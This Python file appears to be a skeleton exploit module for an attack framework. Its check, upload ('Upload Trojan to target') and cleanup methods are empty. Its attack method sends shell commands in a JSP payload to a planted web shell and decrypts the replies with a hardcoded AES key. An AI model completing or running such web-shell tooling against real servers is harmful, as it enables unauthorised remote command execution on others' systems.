import base64
from common.exploit import *
from common.payload import JspPayload
from common.utils import AesDecrypt


class DHZH(Exploit):
    payload_wrapper = JspPayload()
    
    def __init__(self, url):
        self.url = url
        self.client = HttpClient(url)
        self.shell_uri = ""
        
    def check(self):
        '''
        Function: Detect the existence of vulnerability
        Return Value: True or False
        '''
        pass
    
    def upload(self):
        '''
        Function: Upload Trojan to target
        Return Value: ExploitStatus.SUCCESS or ExploitStatus.FAILED
        '''
        pass
    
    def attack(self, cmd):
        '''
        Function: Execute the specified command
        Return Value: Return the result of command execution
        '''

        # a demo
        payload = self.payload_wrapper.generate(cmd, bin="sh")
        result = self.client.request("POST", self.shell_uri, data=payload)
        if result.status_code == 1000:
            self.log("Failed attack", "error")
        elif result.status_code == 200:
            self.log("Successful attack", "info")
            try:
                data = base64.b64decode(result.content)
                return AesDecrypt(b'sky', data)
            except:
                self.log("Failed to decrypt received data", "error")
        return result.content
    
    def clean(self):
        '''
        Function: Cleanup
        Return value: True or False
        '''
        pass

